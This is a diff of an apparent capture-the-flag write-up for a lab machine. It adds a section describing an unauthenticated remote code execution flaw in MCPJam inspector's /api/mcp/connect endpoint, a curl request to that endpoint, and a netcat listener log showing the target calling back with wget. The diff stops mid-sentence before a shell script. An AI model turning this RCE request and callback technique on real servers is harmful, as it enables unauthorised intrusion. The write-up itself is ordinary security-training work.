@@ -14,6 +14,8 @@
 
 Brief 2-3 sentence overview of the machine and attack path.
 
+Note: The machine has different ip addresseses 
+
 ---
 ## Enumeration
 
@@ -127,6 +129,14 @@ IMAGE 2
 
 ---
 ## Foothold
+### Vulnerability
+
+Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE.
+Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request.
+The `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command.
+
+### Exploitation
+
 
 ```
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
@@ -137,36 +147,25 @@ curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
 Testing for RCE.
 
 ```
-nc -lvnp 1111
+nc -lvnp 1111      
 listening on [any] 1111 ...
-connect to [10.10.14.224] from (UNKNOWN) [10.129.59.28] 58440
+connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 54326
 GET / HTTP/1.1
 Host: 10.10.14.224:1111
 User-Agent: Wget/1.21.4
 Accept: */*
 Accept-Encoding: identity
 Connection: Keep-Alive
+
 ```
 
 The listener gets the request back thus confirming the vulerability.
 
 
-
-### Vulnerability
-
-Description of the vulnerability exploited.
-
-### Exploitation
-
-Step-by-step exploitation with commands.
-
-```shell
-# Commands used
-```
-
 ---
 ## User Flag
 
+A reve
 ```
 
 cat shell.sh                        
